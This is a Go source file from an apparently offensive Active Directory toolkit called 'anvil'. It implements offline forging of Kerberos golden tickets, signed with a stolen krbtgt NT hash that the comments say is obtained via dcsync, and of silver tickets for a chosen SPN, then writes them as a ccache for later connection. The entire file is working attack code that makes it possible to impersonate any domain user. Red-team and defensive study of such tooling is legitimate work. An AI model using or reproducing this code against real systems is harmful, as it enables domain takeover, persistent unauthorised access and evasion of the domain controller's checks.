// Package ticket forges Kerberos golden and silver tickets. A golden
// ticket is a TGT for any user, signed and encrypted with the domain's
// krbtgt key (recovered via `anvil dcsync`); a silver ticket is a service
// ticket for one SPN, signed with the machine or service account's key.
// Both are written as a ccache that `anvil connect -k` consumes. Forging
// is fully offline — no KDC is contacted.
package ticket

import (
	"encoding/hex"
	"fmt"
	"os"
	"strings"

	"github.com/mandiant/gopacket/pkg/kerberos"
)

// Options carries the `anvil ticket` inputs.
type Options struct {
	User       string // account the forged ticket impersonates
	Domain     string // DNS domain (realm), e.g. lab.local
	DomainSID  string // domain SID, S-1-5-21-<a>-<b>-<c>
	KrbtgtHash string // krbtgt NT hash, golden ticket (32 hex chars; LM:NT also accepted)
	NTHash     string // machine/service account NT hash, silver ticket (same format)
	SPN        string // target SPN for a silver ticket, <service>/<fqdn>
	Out        string // ccache output path; empty = <user>.ccache in cwd
}

// Forge validates opts, mints a golden TGT or silver service ticket via
// gopacket's kerberos.CreateTicket, and returns the ccache path actually
// written. Silver mode is selected by NTHash (and requires SPN).
func Forge(opts Options) (string, error) {
	silver, hash, err := validateKeyMaterial(opts)
	if err != nil {
		return "", err
	}
	if err := validateDomainSID(opts.DomainSID); err != nil {
		return "", err
	}
	if opts.User == "" {
		return "", fmt.Errorf("-user is required")
	}
	if opts.Domain == "" {
		return "", fmt.Errorf("-domain is required")
	}

	cfg := &kerberos.TicketConfig{
		Username:  opts.User,
		Domain:    opts.Domain,
		DomainSID: opts.DomainSID,
		NTHash:    hash,
	}
	if silver {
		cfg.SPN = opts.SPN
	}
	result, err := kerberos.CreateTicket(cfg)
	if err != nil {
		return "", err
	}

	// CreateTicket always writes <user>.ccache in the cwd; move it when the
	// caller asked for a different path.
	out := opts.Out
	if out == "" {
		out = result.Filename
	}
	if out != result.Filename {
		if err := moveFile(result.Filename, out); err != nil {
			os.Remove(result.Filename) // don't strand the intermediate in cwd
			return "", err
		}
	}
	return out, nil
}

// validateKeyMaterial enforces the golden/silver flag coupling and returns
// whether this is a silver forge plus the normalized NT hash to sign with.
// Golden: -krbtgt only. Silver: -nthash plus -spn.
func validateKeyMaterial(opts Options) (silver bool, hash string, err error) {
	switch {
	case opts.KrbtgtHash != "" && opts.NTHash != "":
		return false, "", fmt.Errorf("-krbtgt and -nthash are mutually exclusive (golden vs silver ticket)")
	case opts.KrbtgtHash == "" && opts.NTHash == "":
		return false, "", fmt.Errorf("exactly one of -krbtgt (golden) or -nthash (silver) is required")
	case opts.KrbtgtHash != "" && opts.SPN != "":
		return false, "", fmt.Errorf("-spn is only valid with -nthash (silver ticket)")
	case opts.NTHash != "" && opts.SPN == "":
		return false, "", fmt.Errorf("-spn is required with -nthash (silver ticket)")
	}
	if opts.NTHash != "" {
		if err := validateSPN(opts.SPN); err != nil {
			return false, "", err
		}
		hash, err := normalizeNTHash(opts.NTHash, "-nthash", "NT hash")
		return true, hash, err
	}
	hash, err = normalizeNTHash(opts.KrbtgtHash, "-krbtgt", "krbtgt NT hash")
	return false, hash, err
}

// validateSPN requires the <service>/<fqdn> form. Anything else yields a
// one-component sname no service principal will match, so reject it here
// instead of forging a ticket that fails at the target.
func validateSPN(s string) error {
	svc, host, ok := strings.Cut(s, "/")
	if !ok || svc == "" || host == "" || strings.Contains(host, "/") {
		return fmt.Errorf("invalid -spn %q: want <service>/<fqdn>, e.g. cifs/dc01.lab.local", s)
	}
	return nil
}

// normalizeNTHash accepts a bare NT hash or secretsdump-style LM:NT and
// returns the NT half. An NT hash is 16 bytes = 32 hex chars. flag and
// what name the value in errors, e.g. "-krbtgt"/"krbtgt NT hash".
func normalizeNTHash(s, flag, what string) (string, error) {
	if s == "" {
		return "", fmt.Errorf("%s is required", flag)
	}
	if i := strings.Index(s, ":"); i >= 0 {
		s = s[i+1:]
	}
	raw, err := hex.DecodeString(s)
	if err != nil {
		return "", fmt.Errorf("invalid %s: not hex", what)
	}
	if len(raw) != 16 {
		return "", fmt.Errorf("invalid %s: want 32 hex chars (16 bytes), got %d", what, len(s))
	}
	return s, nil
}

// validateDomainSID requires the domain SID proper, S-1-5-21-<a>-<b>-<c>.
// A trailing user RID would land inside the PAC's domain SID and produce a
// ticket the KDC refuses, so reject it here instead of forging garbage.
func validateDomainSID(s string) error {
	if s == "" {
		return fmt.Errorf("-domain-sid is required")
	}
	sid, err := kerberos.ParseSID(s)
	if err != nil {
		return fmt.Errorf("invalid domain SID %q: %v", s, err)
	}
	auth := uint64(0)
	for _, b := range sid.IdentifierAuthority {
		auth = auth<<8 | uint64(b)
	}
	if auth != 5 || len(sid.SubAuthority) != 4 || sid.SubAuthority[0] != 21 {
		return fmt.Errorf("invalid domain SID %q: want S-1-5-21-<a>-<b>-<c> (no user RID)", s)
	}
	return nil
}

// moveFile replaces dst with src (0600), then removes src. os.Rename can't
// overwrite an existing dst on Windows, so copy+remove instead.
func moveFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return fmt.Errorf("read forged ccache: %v", err)
	}
	if err := os.WriteFile(dst, data, 0600); err != nil {
		return fmt.Errorf("write %s: %v", dst, err)
	}
	os.Remove(src)
	return nil
}
